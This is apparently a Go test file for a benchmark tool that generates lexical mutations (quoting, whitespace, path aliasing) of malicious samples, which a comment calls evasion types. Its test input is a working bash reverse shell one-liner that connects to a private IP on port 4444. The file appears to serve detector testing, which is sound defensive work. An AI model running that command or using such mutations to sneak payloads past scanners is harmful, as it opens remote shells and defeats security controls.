package benchmark_test

import (
	"testing"

	"aether/internal/benchmark"
)

func TestLexicalMutator_GenerateMutations(t *testing.T) {
	mutator := benchmark.NewLexicalMutator()

	bashSample := []byte("#!/bin/bash\n/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")
	variants := mutator.GenerateMutations(bashSample, "MAL-REV-001")

	if len(variants) == 0 {
		t.Fatalf("Expected mutations for bash reverse shell sample, got 0")
	}

	mutationTypesSeen := make(map[benchmark.MutationType]bool)
	for _, v := range variants {
		if len(v.MutatedContent) == 0 {
			t.Errorf("Variant %s has empty content", v.Description)
		}
		if v.OriginalCaseID != "MAL-REV-001" {
			t.Errorf("Variant case ID mismatch: got %s, want MAL-REV-001", v.OriginalCaseID)
		}
		mutationTypesSeen[v.MutationType] = true
	}

	// Verify key evasion types were produced
	expectedTypes := []benchmark.MutationType{
		benchmark.MutationQuoting,
		benchmark.MutationWhitespace,
		benchmark.MutationPathAliasing,
	}

	for _, et := range expectedTypes {
		if !mutationTypesSeen[et] {
			t.Errorf("Expected mutation type %s was not generated", et)
		}
	}
}

func TestLexicalMutator_Fallback(t *testing.T) {
	mutator := benchmark.NewLexicalMutator()
	plainContent := []byte("simple non-matching data")
	variants := mutator.GenerateMutations(plainContent, "CUSTOM-001")

	if len(variants) == 0 {
		t.Fatalf("Expected fallback mutation for arbitrary content, got 0")
	}
}
